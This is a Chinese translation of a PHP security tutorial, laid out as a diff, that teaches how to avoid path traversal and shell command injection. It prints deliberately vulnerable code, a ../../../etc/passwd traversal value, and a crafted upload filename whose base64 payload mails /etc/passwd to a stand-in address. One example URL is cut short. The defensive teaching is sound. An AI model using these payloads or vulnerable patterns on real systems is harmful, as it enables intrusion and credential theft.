@@ -1,0 +1,255 @@
+PHP 安全及相关
+作者:John Coggeshall
+
+
+
+关注安全问题的重要性 
+看到的远非全部 
+
+阻止用户恶意破坏你的程式最有效却经常被忽略的方法是在写代码时就考虑它的可能性。留意代码中可能的安全问题是很重要的。考虑下边的旨在简化用PHP中写入大量文本文件的过程的实例函数： 
+
+
+
+
+<?php 
+function write_text($filename, $text="") { 
+static $open_files = array(); 
+// 如果文件名空，关闭全部文件 
+if ($filename == NULL) { 
+foreach($open_files as $fr) { 
+fclose($fr); 
+} 
+return true; 
+} 
+$index = md5($filename); 
+if(!isset($open_files[$index])) { 
+$open_files[$index] = fopen($filename, "a+"); 
+if(!$open_files[$index]) return false; 
+} 
+fputs($open_files[$index], $text); 
+return true; 
+}
+?> 
+
+
+
+这个函数带有两个缺省参数，文件名和要写入文件的文本。 
+函数将先检查文件是否已被打开；如果是，将使用原来的文件句柄。否则，将自行创建。在这两种情况中，文本都会被写入文件。 
+如果传递给函数的文件名是NULL，那么所有打开的文件将被关闭。下边提供了一个使用上的实例。 
+如果开发者以下边的格式来写入多个文本文件，那么这个函数将清楚和易读的多。 
+让我们假定这个函数存在于一个单独的文件中，这个文件包含了调用这个函数的代码。 
+下边是一个这样的程式，我们叫它quotes.php： 
+
+<html><body> 
+<form action="<?=$_SERVER['PHP_SELF']?>" method="get"> 
+Choose the nature of the quote: 
+<select name="quote" size="3"> 
+<option value="funny">Humorous quotes</option> 
+<option value="political">Political quotes</option> 
+<option value="love">Romantic Quotes</option> 
+</select><br /> 
+The quote: <input type="text" name="quote_text" size="30" /> 
+<input type="submit" value="Save Quote" /> 
+</form> 
+</body></html> 
+
+
+<?php 
+include_once('write_text.php'); 
+$filename = "/home/web/quotes/{$_GET['quote']}"; 
+$quote_msg = $_GET['quote_text']; 
+if (write_text($filename, $quote_msg)) { 
+echo "<center><hr><h2>Quote saved!</h2></center>"; 
+} else { 
+echo "<center><hr><h2>Error writing quote</h2></center>"; 
+} 
+write_text(NULL); 
+?> 
+
+
+
+如同你看到的，这位开发者使用了write_text()函数来创建一个体系使得用户可以提交他们喜欢的格言，这些格言将被存放在一个文本文件中。 
+不幸的是，开发者可能没有想到，这个程式也允许了恶意用户危害web server的安全。 
+也许现在你正挠着头想着究竟这个看起来很无辜的程式怎样引入了安全风险。 
+如果你看不出来，考虑下边这个URL，记住这个程式叫做quotes.php： 
+
+http://www.somewhere.com/fun/quo ... e_text=garbage+data
+
+当这个URL传递给web server 时将会发生什么？ 
+
+显然，quotes.php将被执行，但是，不是将一句格言写入到我们希望的三个文件中之一，相反的，一个叫做different_file.dat的新文件将被建立，其中包含一个字符串garbage data。 
+
+显然，这不是我们希望的行为，恶意用户可能通过把quote指定为../../../etc/passwd来访问UNIX密码文件从而创建一个帐号（尽管这需要web server以superuser运行程式，如果是这样的，你应该停止阅读，马上去修复它）。 
+
+如果/home/web/quotes/可以通过浏览器访问，可能这个程式最严重的安全问题是它允许任何用户写入和运行任意PHP程式。这将带来无穷的麻烦。 
+
+这 里有一些解决方案。如果你只需要写入目录下的一些文件，可以考虑使用一个相关的数组来存放文件名。如果用户输入的文件存在于这个数组中，就可以安全的写 入。另一个想法是去掉所有的不是数字和字母的字符来确保没有目录分割符号。还有一个办法是检查文件的扩展名来保证文件不会被web server执行。 
+
+原则很简单，作为一个开发者你必须比程式在你希望的情况下运行时考虑更多。 
+
+如果非法数据进入到一个form元素中会发生什么？恶意用户是否能使你的程式以不希望的方式运行？什么方法能阻止这些攻击？你的web server和PHP程式只有在最弱的安全链接下才安全，所以确认这些可能不安全的链接是否安全很重要。 
+
+常见的涉及安全的错误 
+
+这里给出一些要点，一个可能危及安全的编码上的和管理上的失误的简要不完整列表 
+
+
+
+
+错误1。信赖数据 
+这是贯穿于我关于PHP程式安全的讨论的主题，你决不能相信一个来自外部的数据。不管它来自用户提交表单，文件系统的文件或者环境变量，任何数据都不能简单的想当然的采用。所以用户输入必须进行验证并将之格式化以保证安全。 
+
+
+错误2。在web目录中存储敏感数据 
+任何和所有的敏感数据都应该存放在独立于需要使用数据的程式的文件中，并保存在一个不能通过浏览器访问的目录下。当需要使用敏感数据时，再通过include 或 require语句来包含到适当的PHP程式中。 
+
+
+错误3。不使用推荐的安全防范措施 
+PHP 手册包含了在使用和编写PHP程式时关于安全防范的完整章节。手册也（几乎）基于案 例清楚的说明了什么时候存在潜在安全风险和怎么将风险降低到最低。又如，恶意用户依靠开发者和管理员的失误得到关心的安全信息以获取系统的权限。留意这些 警告并适当的采取措施来减小恶意用户给你的系统带来真正的破坏的可能性。
+
+
+
+
+
+
+
+在PHP中执行系统调用 
+在PHP中有很多方法可以执行系统调用。 
+
+比 如， system()， exec()， passthru()， popen()和 反单引号（`）操作符都允许你在程式中执行系统调用。如果不适当的使用上边这些函数将会为恶意用户在你的服务器上执行系统命令打开大门。像在访问文件时， 绝大多数情况下，安全漏洞发生在由于不可靠的外部输入导致的系统命令执行。 
+
+使用系统调用的一个例子程式 
+考虑一个处理http文件上传的程式，它使用zip程序来压缩文件，然后把它移动到指定的目录（默认为/usr/local/archives/）。代码如下： 
+
+
+
+
+<?php 
+$zip = "/usr/bin/zip"; 
+$store_path = "/usr/local/archives/"; 
+
+if (isset($_FILES['file'])) { 
+$tmp_name = $_FILES['file']['tmp_name']; 
+$cmp_name = dirname($_FILES['file']['tmp_name']) . 
+"/{$_FILES['file']['name']}.zip"; 
+$filename = basename($cmp_name); 
+
+if (file_exists($tmp_name)) { 
+$systemcall = "$zip $cmp_name $tmp_name"; 
+$output = `$systemcall`; 
+
+if (file_exists($cmp_name)) { 
+$savepath = $store_path.$filename; 
+rename($cmp_name, $savepath); 
+} 
+} 
+} 
+?> 
+
+<form enctype="multipart/form-data" action="<? 
+php echo $_SERVER['PHP_SELF']; 
+?>" method="POST"> 
+<input type="HIDDEN" name="MAX_FILE_SIZE" value="1048576"> 
+File to compress: <input name="file" type="file"><br /> 
+<input type="submit" value="Compress File"> 
+</form> 
+
+
+虽然这段程式看起来相当简单易懂，但是恶意用户却可以通过一些方法来利用它。最严重的安全问题存在于我们执行了压缩命令（通过`操作符），在下边的行中可以清楚的看到这点： 
+
+if (isset($_FILES['file'])) { 
+$tmp_name = $_FILES['file']['tmp_name']; 
+$cmp_name = dirname($_FILES['file']['tmp_name']) . 
+"/{$_FILES['file']['name']}.zip"; 
+
+$filename = basename($cmp_name); 
+
+if (file_exists($tmp_name)) { 
+$systemcall = "$zip $cmp_name $tmp_name"; 
+$output = `$systemcall`; 
+... 
+欺骗程式执行任意shell命令 
+虽然这段代码看起来相当安全，它却有使任何有文件上传权限的用户执行任意shell命令的潜在危险！ 
+
+准确的说，这个安全漏洞来自对$cmp_name变量的赋值。在这里，我们希望压缩后的文件使用从客户机上传时的文件名（带有 .zip扩展名）。我们用到了$_FILES['file']['name']（它包含了上传文件在客户机时的文件名）。 
+
+在这样的情况下，恶意用户完全可以通过上传一个含对底层操作系统有特殊意义字符的文件来达到自己的目的。举个例子，如果用户按照下边的形式创建一个空文件会怎么样？（UNIX shell提示符下） 
+
+[user@localhost]# touch ";php -r '$code=base64_decode( 
+"bWFpbCBiYWR1c2VyQHNvbWV3aGVyZS5jb20gPCAvZXRjL3Bhc3N3ZA=="); 
+system($code);';" 
+这个命令将创建一个名字如下的文件： 
+
+;php -r '$code=base64_decode( 
+"bWFpbCBiYWR1c2VyQHNvbWV3aGVyZS5jb20gPCAvZXRjL3Bhc3N3ZA=="); 
+system($code);'; 
+看起来很奇怪？让我们来看看这个“文件名”，我们发现它很像使CLI版本的PHP执行如下代码的命令： 
+
+
+<?php 
+$code=base64_decode( 
+"bWFpbCBiYWR1c2VyQHNvbWV3aGVyZS5jb20gPCAvZXRjL3Bhc3N3ZA=="); 
+system($code); 
+?> 
+
+
+如果你出于好奇而显示$code变量的内容，就会发现它包含了mail baduser@somewhere.com < /etc/passwd。如果用户把这个文件传给程式，接着PHP执行系统调用来压缩文件，PHP实际上将执行如下语句： 
+
+/usr/bin/zip /tmp/;php -r 
+'$code=base64_decode( 
+"bWFpbCBiYWR1c2VyQHNvbWV3aGVyZS5jb20gPCAvZXRjL3Bhc3N3ZA=="); 
+system($code);';.zip /tmp/phpY4iatI 
+让人吃惊的，上边的命令不是一个语句而是3个！由于UNIX shell 把分号（;）解释为一个shell命令的结束和另一命令的开始，除了分号在在引号中时，PHP的system()实际上将如下执行： 
+
+[user@localhost]# /usr/bin/zip /tmp/ 
+[user@localhost]# php -r 
+'$code=base64_decode( 
+"bWFpbCBiYWR1c2VyQHNvbWV3aGVyZS5jb20gPCAvZXRjL3Bhc3N3ZA=="); 
+system($code);' 
+[user@localhost]# .zip /tmp/phpY4iatI 
+如你所见，这个看起来无害的PHP程式突然变成执行任意shell命令和其他PHP程式的后门。虽然这个例子只会在路径下有CLI版本的PHP的系统上有效，但是用这种技术可以通过其他的方法来达到同样的效果。 
+
+对抗系统调用攻击 
+这里的关键仍然是，来自用户的输入，不管内容如何，都不应该相信！问题仍然是如何在使用系统调用时（除了根本不使用它们）避免类似的情况出现。为了对抗这种类型的攻击，PHP提供了两个函数，escapeshellarg() 和 escapeshellcmd()。 
+
+escapeshellarg()函数是为了从用作系统命令的参数的用户输入（在我们的例子中，是zip命令）中移出含有潜在危险的字符而设计的。这个函数的语法如下： 
+
+escapeshellarg($string) 
+$string所在处是用于过滤的输入，返回值是过滤后的字符。执行时，这个函数将在字符两边添加单引号，并转义原来字符串中的单引号（在其前边加上）。在我们的例程中，如果我们在执行系统命令之前加上这些行： 
+
+$cmp_name = escapeshellarg($cmp_name); 
+$tmp_name = escapeshellarg($tmp_name); 
+我们就能通过确保传递给系统调用的参数已经处理，是一个没有其他意图的用户输入，以规避这样的安全风险。 
+
+escapeshellcmd ()和escapeshellarg()类似，只是它只转义对底层操作系统有特殊意义的字符。和escapeshellarg()不同， escapeshellcmd()不会处理内容中的空白格。举个实例，当使用escapeshellcmd()转义时，字符 
+
+$string = "'hello, world!';evilcommand" 
+将变为： 
+
+'hello, world';evilcommand 
+如 果这个字符串用作系统调用的参数它将仍然不能得到正确的结果，因为shell将会把它分别解释为两个分离的参数: 'hello 和 world';evilcommand。如果用户输入用于系统调用的参数列表部分，escapeshellarg()是一个更好的选择。 
+
+
+保护上传的文件 
+在整篇文章中，我一直只着重讲系统调用如何被恶意用户劫持以产生我们不希望结果。 
+但是，这里还有另外一个潜在的安全风险值得提到。再看到我们的例程，把你的注意力集中在下边的行上： 
+
+$tmp_name = $_FILES['file']['tmp_name']; 
+$cmp_name = dirname($_FILES['file']['tmp_name']) . 
+"/{$_FILES['file']['name']}.zip"; 
+
+$filename = basename($cmp_name); 
+if (file_exists($tmp_name)) { 
+上边片断中的代码行导致的一个潜在安全风险是，最后一行我们判断上传的文件是否实际存在（以临时文件名$tmp_name存在）。 
+
+这个安全风险并不来自于PHP自身，而在于保存在$tmp_name中的文件名实际上根本不是一个文件，而是指向恶意用户希望访问的文件，比如，/etc/passwd。 
+
+为了防止这样的情况发生，PHP提供了is_uploaded_file()函数，它和file_exists()一样，但是它还提供文件是否真的从客户机上上传的检查。 
+
+在 绝大多数情况下，你将需要移动上传的文件，PHP提供了move_uploaded_file()函数，来配合is_uploaded_file()。这 个函数和rename()一样用于移动文件，只是它会在执行前自动检查以确保被移动的文件是上传的文件。move_uploaded_file()的语法 如下： 
+
+move_uploaded_file($filename, $destination); 
+在执行时，函数将移动上传文件$filename到目的地$destination并返回一个布尔值来标志操作是否成功。 
+
+注： John Coggeshall 是一位PHP顾问和作者。从他开始为PHP不眠已经5年左右了。  
+英文原文：http://www.onlamp.com/pub/a/php/2003/08/28/php_foundations.html
